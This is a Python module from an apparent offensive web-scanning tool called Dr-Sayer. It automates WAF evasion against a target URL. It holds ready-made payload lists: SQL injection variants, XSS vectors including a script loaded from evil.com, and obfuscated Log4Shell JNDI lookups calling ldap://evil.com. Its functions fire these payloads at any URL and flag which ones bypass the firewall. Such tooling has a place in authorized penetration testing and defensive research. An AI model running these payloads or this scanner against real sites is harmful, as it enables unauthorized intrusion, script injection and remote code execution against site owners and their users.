"""
WAF Bypass Techniques Module for Dr-Sayer
Author: SayerLinux (SayerLinux@outlook.sa)
"""

import requests
import time
import base64
import urllib.parse
import random
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

class WAFSBypass:
    """Web Application Firewall (WAF) bypass techniques"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # SQL Injection bypass techniques
        self.sql_bypass_techniques = {
            'case_variation': [
                "' OR '1'='1",
                "' OR '1'='1",
                "' Or '1'='1",
                "' oR '1'='1",
                "' OR '1'='1",
                "' OR '1'='1"
            ],
            'comment_insertion': [
                "' OR/**/1=1",
                "' OR/**/1=1/**/--",
                "' OR/**/1=1#",
                "'/**/OR/**/1=1",
                "' OR/**_**/1=1",
                "' OR/**//**/1=1",
                "' OR/**//*!1=1*/",
                "' OR/**/1=1/**/LIMIT/**/1"
            ],
            'encoding_bypass': [
                "'%4f%52%20%31%3d%31",
                "'%4F%52%20%31%3D%31",
                "' OR 0x31=0x31",
                "' OR CHAR(49)=CHAR(49)",
                "' OR UNICODE(49)=UNICODE(49)",
                "' OR 0b110001=0b110001",
                "' OR 49=49",
                "' OR '1' LIKE '1'",
                "' OR '1' IN ('1')"
            ],
            'whitespace_bypass': [
                "'OR'1'='1",
                "'OR(1=1)",
                "'OR(1)LIKE(1)",
                "'OR(1)IN(1)",
                "'OR(1)BETWEEN(1)AND(1)",
                "'OR(1)>(0)",
                "'OR(1)>=(1)"
            ],
            'logical_bypass': [
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR '1'='1'/*",
                "' OR 1=1 AND 1=1",
                "' OR 1=1 AND 2>1",
                "' OR 1=1 AND 3>=2"
            ],
            'union_bypass': [
                "' UNION SELECT NULL--",
                "' UNION/**/SELECT/**/NULL--",
                "' UNION/**_**/SELECT/**_**/NULL--",
                "' UNION/**//*!SELECT*/NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION DISTINCT SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL#"
            ]
        }
        
        # XSS bypass techniques
        self.xss_bypass_techniques = {
            'case_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<SCRIPT>alert("XSS")</SCRIPT>',
                '<script>alert("XSS")</script>',
                '<ScRiPt>alert(/XSS/)</ScRiPt>',
                '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>'
            ],
            'tag_bypass': [
                '<img src=x onerror=alert("XSS")>',
                '<IMG SRC=x onerror=alert("XSS")>',
                '<ImG sRc=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<SVG ONLOAD=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<BODY ONLOAD=alert("XSS")>'
            ],
            'event_bypass': [
                '<img src=x onerror="alert(1)">',
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                '<svg onload=alert(1)>',
                '<body onpageshow=alert(1)>',
                '<video src=x onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>'
            ],
            'encoding_bypass': [
                '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
                '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
                '\\x3cscript\\x3ealert(\\x22XSS\\x22)\\x3c/script\\x3e',
                '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e'
            ],
            'protocol_bypass': [
                '<iframe src="javascript:alert(1)">',
                '<iframe src="data:text/html,<script>alert(1)</script>">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<form action="javascript:alert(1)"><input type=submit>'
            ]
        }
        
        # Log4j bypass techniques
        self.log4j_bypass_techniques = {
            'obfuscation': [
                '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
                '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}',
                '${${upper:j}ndi:${upper:l}${upper:d}a${upper:p}://evil.com/a}',
                '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}',
                '${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}',
                '${${::-j}ndi:ldap://evil.com/a}',
                '${${date:j}ndi:ldap://evil.com/a}'
            ],
            'nested': [
                '${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}',
                '${${k8s:k5:-j}${k8s:k5:-n}${k8s:k5:-d}${k8s:k5:-i}:${k8s:k5:-l}${k8s:k5:-d}${k8s:k5:-a}${k8s:k5:-p}://evil.com/a}',
                '${j${k8s:k5:-n}di:ldap://evil.com/a}',
                '${j${k8s:k5:-n}d${k8s:k5:-i}:ldap://evil.com/a}',
                '${j${k8s:k5:-n}d${k8s:k5:-i}:${k8s:k5:-l}dap://evil.com/a}'
            ]
        }
        
        # WAF detection patterns
        self.waf_patterns = [
            'cloudflare',
            'akamai',
            'incapsula',
            'sucuri',
            'wordfence',
            'mod_security',
            'aws_waf',
            'barracuda',
            'f5',
            'imperva',
            'fortinet',
            'palo_alto',
            'citrix',
            'denyall',
            'edgecast'
        ]
    
    def detect_waf(self, response_headers: Dict[str, str], response_text: str) -> List[str]:
        """Detect presence of WAF based on response"""
        detected_wafs = []
        
        # Check headers
        for header_name, header_value in response_headers.items():
            header_lower = header_name.lower()
            value_lower = header_value.lower()
            
            for waf in self.waf_patterns:
                if waf.lower() in header_lower or waf.lower() in value_lower:
                    detected_wafs.append(waf)
        
        # Check response body
        response_lower = response_text.lower()
        
        waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'akamai': ['akamai', 'ghost'],
            'incapsula': ['incapsula', 'visid_incap'],
            'sucuri': ['sucuri', 'access denied'],
            'mod_security': ['mod_security', 'not acceptable'],
            'aws_waf': ['aws waf', 'awsalb'],
            'barracuda': ['barracuda', 'barra'],
            'f5': ['f5', 'bigip'],
            'imperva': ['imperva', 'incapsula']
        }
        
        for waf_name, signatures in waf_signatures.items():
            for signature in signatures:
                if signature.lower() in response_lower:
                    detected_wafs.append(waf_name)
                    break
        
        return list(set(detected_wafs))
    
    def test_bypass_technique(self, url: str, original_payload: str, bypass_payloads: List[str], 
                            technique_name: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test a specific bypass technique"""
        results = []
        
        for bypass_payload in bypass_payloads:
            try:
                # Test GET parameter
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [bypass_payload]
                
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
                
                # Make request
                response = self.session.get(test_url, timeout=10)
                
                # Check if bypass was successful
                waf_detected = self.detect_waf(response.headers, response.text)
                
                result = {
                    'technique': technique_name,
                    'payload': bypass_payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'waf_detected': waf_detected,
                    'bypass_successful': len(waf_detected) == 0 and response.status_code == 200
                }
                
                results.append(result)
                
            except requests.exceptions.RequestException as e:
                results.append({
                    'technique': technique_name,
                    'payload': bypass_payload,
                    'error': str(e),
                    'bypass_successful': False
                })
        
        return {
            'technique': technique_name,
            'results': results,
            'successful_bypasses': [r for r in results if r['bypass_successful']]
        }
    
    def test_sql_bypass(self, url: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test SQL injection bypass techniques"""
        print(f"[*] Testing SQL injection bypass techniques")
        
        all_results = []
        
        for technique_name, payloads in self.sql_bypass_techniques.items():
            print(f"  [*] Testing {technique_name} technique")
            result = self.test_bypass_technique(url, "' OR 1=1--", payloads, technique_name, param_name)
            all_results.append(result)
        
        return {
            'attack_type': 'SQL Injection',
            'techniques': all_results,
            'total_techniques': len(all_results),
            'successful_bypasses': sum(len(r['successful_bypasses']) for r in all_results)
        }
    
    def test_xss_bypass(self, url: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test XSS bypass techniques"""
        print(f"[*] Testing XSS bypass techniques")
        
        all_results = []
        
        for technique_name, payloads in self.xss_bypass_techniques.items():
            print(f"  [*] Testing {technique_name} technique")
            result = self.test_bypass_technique(url, '<script>alert("XSS")</script>', payloads, technique_name, param_name)
            all_results.append(result)
        
        return {
            'attack_type': 'Cross-Site Scripting (XSS)',
            'techniques': all_results,
            'total_techniques': len(all_results),
            'successful_bypasses': sum(len(r['successful_bypasses']) for r in all_results)
        }
    
    def test_log4j_bypass(self, url: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test Log4j bypass techniques"""
        print(f"[*] Testing Log4j bypass techniques")
        
        all_results = []
        
        for technique_name, payloads in self.log4j_bypass_techniques.items():
            print(f"  [*] Testing {technique_name} technique")
            result = self.test_bypass_technique(url, '${jndi:ldap://evil.com/a}', payloads, technique_name, param_name)
            all_results.append(result)
        
        return {
            'attack_type': 'Log4j Injection (CVE-2021-44228)',
            'techniques': all_results,
            'total_techniques': len(all_results),
            'successful_bypasses': sum(len(r['successful_bypasses']) for r in all_results)
        }
    
    def test_encoding_bypass(self, url: str, payload: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test various encoding bypass techniques"""
        print(f"[*] Testing encoding bypass techniques")
        
        encoded_payloads = [
            urllib.parse.quote(payload),
            urllib.parse.quote_plus(payload),
            base64.b64encode(payload.encode()).decode(),
            ''.join(f'%{ord(c):02x}' for c in payload),  # Full URL encoding
            ''.join(f'\\x{ord(c):02x}' for c in payload),  # Hex encoding
            ''.join(f'\\u{ord(c):04x}' for c in payload),  # Unicode encoding
            payload.encode('utf-8').decode('unicode_escape'),  # Unicode escape
            payload.replace(' ', '+'),  # Space to plus
            payload.replace(' ', '%20'),  # Space encoding
            payload.replace('<', '%3C').replace('>', '%3E'),  # HTML encoding
        ]
        
        return self.test_bypass_technique(url, payload, encoded_payloads, 'Encoding Bypass', param_name)
    
    def test_case_bypass(self, url: str, payload: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test case variation bypass techniques"""
        print(f"[*] Testing case variation bypass techniques")
        
        case_variations = [
            payload.upper(),
            payload.lower(),
            payload.title(),
            payload.swapcase(),
            ''.join(random.choice([c.upper(), c.lower()]) for c in payload),  # Random case
            payload.replace('script', 'ScRiPt'),
            payload.replace('alert', 'AlErT'),
            payload.replace('javascript', 'JaVaScRiPt'),
            payload.replace('onload', 'OnLoAd'),
            payload.replace('onerror', 'OnErRoR'),
        ]
        
        return self.test_bypass_technique(url, payload, case_variations, 'Case Variation', param_name)
    
    def test_fragmentation_bypass(self, url: str, payload: str, param_name: str = 'test') -> Dict[str, Any]:
        """Test payload fragmentation bypass techniques"""
        print(f"[*] Testing fragmentation bypass techniques")
        
        fragmented_payloads = []
        
        # Split payload into parts
        if len(payload) > 3:
            mid = len(payload) // 2
            fragmented_payloads.extend([
                payload[:mid] + payload[mid:],  # Normal
                payload[:mid] + '/**/' + payload[mid:],  # With comment
                payload[:mid] + ' ' + payload[mid:],  # With space
                payload[:mid] + '+' + payload[mid:],  # With plus
                payload[:mid] + '%00' + payload[mid:],  # With null byte
            ])
        
        # Parameter pollution
        if '=' in payload:
            parts = payload.split('=')
            if len(parts) == 2:
                fragmented_payloads.extend([
                    f"{parts[0]}={parts[1]}",
                    f"{parts[0]}[]={parts[1]}",
                    f"{parts[0]}={parts[1]}&{parts[0]}={parts[1]}",
                ])
        
        return self.test_bypass_technique(url, payload, fragmented_payloads, 'Fragmentation', param_name)
    
    def test_bypass_techniques(self, target_url: str, test_payload: str) -> Dict[str, Any]:
        """Main method to test various WAF bypass techniques"""
        print(f"[*] Starting WAF bypass tests on {target_url}")
        
        all_results = []
        
        # Test different bypass categories
        sql_bypass = self.test_sql_bypass(target_url)
        xss_bypass = self.test_xss_bypass(target_url)
        log4j_bypass = self.test_log4j_bypass(target_url)
        encoding_bypass = self.test_encoding_bypass(target_url, test_payload)
        case_bypass = self.test_case_bypass(target_url, test_payload)
        fragmentation_bypass = self.test_fragmentation_bypass(target_url, test_payload)
        
        all_results.extend([
            sql_bypass, xss_bypass, log4j_bypass,
            {'attack_type': 'Encoding Bypass', 'techniques': [encoding_bypass]},
            {'attack_type': 'Case Variation', 'techniques': [case_bypass]},
            {'attack_type': 'Fragmentation', 'techniques': [fragmentation_bypass]}
        ])
        
        # Analyze overall results
        total_successful = sum(
            sum(len(tech.get('successful_bypasses', [])) for tech in result.get('techniques', []))
            for result in all_results
        )
        
        return {
            'target': target_url,
            'techniques': all_results,
            'total_successful_bypasses': total_successful,
            'bypass_summary': self.generate_bypass_summary(all_results)
        }
    
    def generate_bypass_summary(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate summary of successful bypass techniques"""
        summary = {
            'total_techniques_tested': 0,
            'successful_techniques': [],
            'failed_techniques': [],
            'most_effective': None,
            'recommendations': []
        }
        
        for result in results:
            attack_type = result.get('attack_type', 'Unknown')
            techniques = result.get('techniques', [])
            
            for technique in techniques:
                summary['total_techniques_tested'] += 1
                successful_count = len(technique.get('successful_bypasses', []))
                
                if successful_count > 0:
                    summary['successful_techniques'].append({
                        'attack_type': attack_type,
                        'technique': technique.get('technique', 'Unknown'),
                        'success_count': successful_count
                    })
                else:
                    summary['failed_techniques'].append({
                        'attack_type': attack_type,
                        'technique': technique.get('technique', 'Unknown')
                    })
        
        # Find most effective technique
        if summary['successful_techniques']:
            most_effective = max(summary['successful_techniques'], 
                               key=lambda x: x['success_count'])
            summary['most_effective'] = most_effective
        
        # Generate recommendations
        if summary['successful_techniques']:
            summary['recommendations'].append("WAF bypass successful - consider strengthening WAF rules")
            summary['recommendations'].append("Implement additional security layers beyond WAF")
        else:
            summary['recommendations'].append("WAF appears to be effectively blocking tested payloads")
            summary['recommendations'].append("Continue monitoring for new bypass techniques")
        
        return summary
    
    def generate_report_data(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate formatted report data"""
        return {
            'module': 'WAF Bypass Techniques',
            'target': results['target'],
            'total_successful_bypasses': results['total_successful_bypasses'],
            'techniques': results['techniques'],
            'bypass_summary': results['bypass_summary'],
            'testing_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }